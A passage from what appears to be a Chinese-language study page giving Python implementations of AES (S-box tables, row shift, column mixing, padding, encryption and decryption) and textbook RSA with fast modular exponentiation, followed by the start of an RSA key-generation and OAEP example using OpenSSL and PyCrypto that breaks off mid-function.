class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>            <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>            <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>            <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>            <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>            <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>            <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>            <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span><br>        )<br>        <span class="hljs-keyword">return</span> sbox_inv[b]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Rowmovs</span>(<span class="hljs-params">self, text</span>):<br>        <span class="hljs-comment">#行移位</span><br>        list1 = text[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>        list2 = text[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]<br>        <span class="hljs-variable language_">self</span>.Rotword(list2)<br>        list3 = text[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-variable language_">self</span>.Rotword(list3)<br>        <span class="hljs-variable language_">self</span>.Rotword(list3)<br>        list4 = text[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>]<br>        list4.insert(<span class="hljs-number">0</span>, list4.pop())<br>        <span class="hljs-keyword">return</span> list1 + list2 + list3 + list4<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Rowmovs_inv</span>(<span class="hljs-params">self, text</span>):<br>        <span class="hljs-comment">#逆向行移位</span><br>        list1 = text[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>        list2 = text[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]<br>        list2.insert(<span class="hljs-number">0</span>, list2.pop())<br>        list3 = text[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-variable language_">self</span>.Rotword(list3)<br>        <span class="hljs-variable language_">self</span>.Rotword(list3)<br>        list4 = text[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-variable language_">self</span>.Rotword(list4)<br>        <span class="hljs-keyword">return</span> list1 + list2 + list3 + list4<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Column_mix</span>(<span class="hljs-params">self, text</span>):<br>        list_tool = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]  <span class="hljs-comment"># 正向列混淆矩阵</span><br>        result = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                temp0 = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    <span class="hljs-comment"># print(f&quot;&#123;hex(list_tool[k + 4 * i])&#125;*&#123;hex(text[j + 4 * k])&#125;&quot;)</span><br>                    temp0 ^= <span class="hljs-variable language_">self</span>.gf_mul(list_tool[k + <span class="hljs-number">4</span> * i], text[j + <span class="hljs-number">4</span> * k])<br>                <span class="hljs-comment"># print(f&quot;&#123;hex(temp0)&#125;&quot;)</span><br>                result.append(temp0)<br>        <span class="hljs-comment"># for i in range(16):</span><br>        <span class="hljs-comment">#     print(f&quot;&#123;hex(result[i])&#125; &quot;,end=&#x27;&#x27;)</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Column_mix_inv</span>(<span class="hljs-params">self, text</span>):<br>        list_tool = [<span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>]<br>        result = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                temp0 = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    <span class="hljs-comment"># print(f&quot;&#123;hex(list_tool[k + 4 * i])&#125;*&#123;hex(text[j + 4 * k])&#125;&quot;)</span><br>                    temp0 ^= <span class="hljs-variable language_">self</span>.gf_mul(list_tool[k + <span class="hljs-number">4</span> * i], text[j + <span class="hljs-number">4</span> * k])<br>                <span class="hljs-comment"># print(f&quot;&#123;hex(temp0)&#125;&quot;)</span><br>                result.append(temp0)<br>        <span class="hljs-comment"># for i in range(16):</span><br>        <span class="hljs-comment">#     print(f&quot;&#123;hex(result[i])&#125; &quot;,end=&#x27;&#x27;)</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">self, text</span>):<br>        <span class="hljs-comment"># 填充函数，使明文长度为16字节的倍数，填充值是缺乏的长度，填充标准采用了PKCS#7</span><br>        <span class="hljs-variable language_">self</span>.pad_len = (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(text)) % <span class="hljs-number">16</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pad_len != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.pad_len):<br>                text.append(<span class="hljs-built_in">str</span>(<span class="hljs-variable language_">self</span>.pad_len))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">unpad</span>(<span class="hljs-params">self, text</span>):<br>        <span class="hljs-comment"># 去填充函数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pad_len != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.pad_len):<br>                text.pop()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self, text</span>):<br>        <span class="hljs-variable language_">self</span>.pad(text)<br>        <span class="hljs-comment">#print(text)</span><br>        <span class="hljs-comment"># 初始轮密钥加</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                text[i * <span class="hljs-number">4</span> + j] = <span class="hljs-built_in">int</span>(text[i * <span class="hljs-number">4</span> + j]) ^ <span class="hljs-variable language_">self</span>.exkey[i][j]<br>        <span class="hljs-keyword">for</span> times <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>            <span class="hljs-comment"># S盒变换</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>                <span class="hljs-comment"># print(hex(text[i]))</span><br>                text[i] = <span class="hljs-variable language_">self</span>.Sbox(text[i])<br>                <span class="hljs-comment"># print(hex(text[i]))</span><br>            <span class="hljs-comment"># 行移位</span><br>            text = <span class="hljs-variable language_">self</span>.Rowmovs(text)<br>            <span class="hljs-comment"># for i in text:</span><br>            <span class="hljs-comment">#     print(f&quot;&#123;hex(i)&#125; &quot;,end=&#x27;&#x27;)</span><br>            <span class="hljs-comment"># print()</span><br>            <span class="hljs-comment"># 列混淆</span><br>            text = <span class="hljs-variable language_">self</span>.Column_mix(text)<br>            <span class="hljs-comment"># for i in text:</span><br>            <span class="hljs-comment">#     print(f&quot;&#123;hex(i)&#125; &quot;, end=&#x27;&#x27;)</span><br>            <span class="hljs-comment"># print()</span><br>            <span class="hljs-comment"># 轮密钥加</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    text[i * <span class="hljs-number">4</span> + j] = text[i * <span class="hljs-number">4</span> + j] ^ <span class="hljs-variable language_">self</span>.exkey[<span class="hljs-number">4</span> * times + i][j]<br>        <span class="hljs-comment"># 第10轮</span><br>        <span class="hljs-comment"># S盒变换</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            text[i] = <span class="hljs-variable language_">self</span>.Sbox(text[i])<br>        <span class="hljs-comment"># 行移位</span><br>        text = <span class="hljs-variable language_">self</span>.Rowmovs(text)<br>        <span class="hljs-comment"># 轮密钥加</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                text[i * <span class="hljs-number">4</span> + j] = text[i * <span class="hljs-number">4</span> + j] ^ <span class="hljs-variable language_">self</span>.exkey[<span class="hljs-number">40</span> + i][j]<br>        text_t = [[text[i + j * <span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>        text_t = [item <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> text_t <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> row]<br>        hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(x, <span class="hljs-string">&#x27;02x&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> text_t).encode()<br>        <span class="hljs-keyword">return</span> hex_str<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, text_t</span>):<br>        <span class="hljs-variable language_">self</span>.unpad(text_t)<br>        text = [[text_t[i + j * <span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>        text = [item <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> text <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> row]<br>        <span class="hljs-comment"># 先执行一次轮密钥加</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                text[i * <span class="hljs-number">4</span> + j] = text[i * <span class="hljs-number">4</span> + j] ^ <span class="hljs-variable language_">self</span>.exkey[<span class="hljs-number">40</span> + i][j]<br>        <span class="hljs-comment"># 逆向行移位</span><br>        text = <span class="hljs-variable language_">self</span>.Rowmovs_inv(text)<br>        <span class="hljs-comment"># 逆S盒变换</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            text[i] = <span class="hljs-variable language_">self</span>.Sbox_inv(text[i])<br>        <span class="hljs-keyword">for</span> times <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            <span class="hljs-comment"># 轮密钥加</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    text[i * <span class="hljs-number">4</span> + j] = text[i * <span class="hljs-number">4</span> + j] ^ <span class="hljs-variable language_">self</span>.exkey[<span class="hljs-number">4</span> * times + i][j]<br>            <span class="hljs-comment"># 逆向列混淆</span><br>            text = <span class="hljs-variable language_">self</span>.Column_mix_inv(text)<br>            <span class="hljs-comment"># 逆向行移位</span><br>            text = <span class="hljs-variable language_">self</span>.Rowmovs_inv(text)<br>            <span class="hljs-comment"># 逆S盒</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>                text[i] = <span class="hljs-variable language_">self</span>.Sbox_inv(text[i])<br><br>        <span class="hljs-comment"># 最后的轮密钥加</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                text[i * <span class="hljs-number">4</span> + j] = <span class="hljs-built_in">int</span>(text[i * <span class="hljs-number">4</span> + j]) ^ <span class="hljs-variable language_">self</span>.exkey[i][j]<br>        <span class="hljs-comment"># for i in range(16):</span><br>        <span class="hljs-comment">#     print(f&quot;&#123;hex(text[i])&#125; &quot;,end=&#x27;&#x27;)</span><br>        <span class="hljs-comment"># print()</span><br>        text_t = [[text[i + j * <span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>        text_t = [item <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> text_t <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> row]<br>        hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> text_t).encode()<br>        <span class="hljs-keyword">return</span> hex_str<br><br><br><span class="hljs-comment">#************End***************</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Evidence</span>(<span class="hljs-params">text, keys</span>):<br>    <span class="hljs-comment"># 要求key长度为16</span><br>    keys = [<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(a)) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> keys]<br>    text = [<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(a)) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> text]<br>    text_t = [[text[i + j * <span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    text_t = [item <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> text_t <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> row]<br>    aes = aestest(keys)<br>    enc = aes.encrypt(text_t)<br>    <span class="hljs-built_in">print</span>(enc)<br>    detext = aes.decrypt([strs <span class="hljs-keyword">for</span> strs <span class="hljs-keyword">in</span> a2b_hex(enc)])<br>    <span class="hljs-built_in">print</span>(detext)<br><br><br>text, keys = <span class="hljs-built_in">input</span>().split()<br><span class="hljs-comment"># 测试数据</span><br><span class="hljs-comment"># text = [0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10]</span><br><span class="hljs-comment"># keys = [0xf, 0x15, 0x71, 0xc9, 0x47, 0xd9, 0xe8, 0x59, 0x0c, 0xb7, 0xad, 0xd6, 0xaf, 0x7f, 0x67, 0x98]</span><br><span class="hljs-comment"># 密文ff0b844a0853bf7c6934ab4364148fb9</span><br>Evidence(text, keys)<br></code></pre></td></tr></table></figure><h2 id="公钥密码算法"><a href="#公钥密码算法" class="headerlink" title="公钥密码算法"></a>公钥密码算法</h2><h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><ul><li>快速幂乘法注意：<ul><li>首次乘乘数，其次每次都乘本身，不要混淆乘每次都乘乘数</li><li>结果也是累的积</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#从底层实现RSA算法的加密和解密，要求加密和解密过程的求幂过程采用快速乘方算法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">rsatest</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,e,d,n</span>):<br>        <span class="hljs-variable language_">self</span>.e = e<br>        <span class="hljs-variable language_">self</span>.d = d<br>        <span class="hljs-variable language_">self</span>.n = n<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">quick_pow</span>(<span class="hljs-params">self,code,times</span>):<br>        times = <span class="hljs-built_in">bin</span>(times)[<span class="hljs-number">2</span>:]<br>        factor = <span class="hljs-number">1</span>  <span class="hljs-comment"># 乘数</span><br>        flag = <span class="hljs-number">1</span><br>        result = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(times)-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>                flag = <span class="hljs-number">0</span><br>                factor = code<br>            <span class="hljs-keyword">else</span>:<br>                factor = factor * factor<br>                factor %= <span class="hljs-variable language_">self</span>.n<br>            <span class="hljs-keyword">if</span> times[i] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                result *= factor<br>                result %= <span class="hljs-variable language_">self</span>.n<br>        <span class="hljs-keyword">return</span> result<br><br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,p</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.quick_pow(p, <span class="hljs-variable language_">self</span>.e)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,enc</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.quick_pow(enc, <span class="hljs-variable language_">self</span>.d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Evidence</span>(<span class="hljs-params">p,e,d,n</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    :param p: 明文</span><br><span class="hljs-string">    :param e: 公钥</span><br><span class="hljs-string">    :param d: 私钥</span><br><span class="hljs-string">    :param n: 模</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    rsa = rsatest(e,d,n)<br>    enc = rsa.encrypt(p)<br>    <span class="hljs-built_in">print</span>(enc)<br>    detext = rsa.decrypt(enc)<br>    <span class="hljs-built_in">print</span>(detext)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    str1, str2 ,str3,str4 = <span class="hljs-built_in">input</span>().split()<br>    p = <span class="hljs-built_in">int</span>(str1)<br>    e = <span class="hljs-built_in">int</span>(str2)<br>    d = <span class="hljs-built_in">int</span>(str3)<br>    n = <span class="hljs-built_in">int</span>(str4)<br>    Evidence(p,e,d,n)<br></code></pre></td></tr></table></figure><h3 id="调用模块生成RSA密钥，并执行"><a href="#调用模块生成RSA密钥，并执行" class="headerlink" title="调用模块生成RSA密钥，并执行"></a>调用模块生成RSA密钥，并执行</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs css">import base64<br><span class="hljs-selector-tag">from</span> OpenSSL<span class="hljs-selector-class">.crypto</span> import PKey, TYPE_RSA, FILETYPE_PEM, dump_privatekey, dump_publickey<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.PublicKey</span> import RSA<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Cipher</span> import PKCS1_OAEP<br><br><br>def generate_rsa_keys():<br>    # 创建 PKey 对象并生成 RSA 密钥<br>    key = <span class="hljs-built_in">PKey</span>()<br>    key.<span class="hljs-built_in">generate_key</span>(TYPE_RSA, <span class="hljs-number">2048</span>)<br><br>    # 导出公私钥到 PEM 格式（字节串）<br>    private_key_pem = <span class="hljs-built_in">dump_privatekey</span>(FILETYPE_PEM, key)<br>    public_key_pem = <span class="hljs-built_in">dump_publickey</span>(FILETYPE_PEM, key)<br><br>    # 将字节串转化为 PEM 格式的字符串，包含正确的标记<br>    private_key_pem_str = private_key_pem.<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    public_key_pem_str = public_key_pem.<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    # 将 PEM 格式的密钥保存到文件<br>    # with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;private_key.pem&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) as private_file:<br>    #     private_file.<span class="hljs-built_in">write</span>(private_key_pem_str)<br>    #<br>    # with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;public_key.pem&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) as public_file:<br>    #     public_file.<span class="hljs-built_in">write</span>(public_key_pem_str)<br><br>    return private_key_pem_str, public_key_pem_str<br><br><br>def <span class="hljs-built_in">encrypt_text</span>(public_key_pem_str, text):<br>    # 使用 PyCrypto 加载公钥<br>    public_key = RSA.<span class="hljs-built_in">importKey</span>(public_key_pem_str.<span class="hljs-built_in">encode</span>())<br><br>    cipher = PKCS1_OAEP.<span class="hljs-built_in">new</span>(public_key)<br><br>    encrypted_text = cipher.<span class="hljs-built_in">encrypt</span>(text.<span class="hljs-built_in">encode</span>())<br>    return base64.<span class="hljs-built_in">b64encode</span>(encrypted_text).<span class="hljs-built_in">decode</span>()<br><br><br>def <span class="hljs-built_in">decrypt_text</span>(private_key_pem_str, 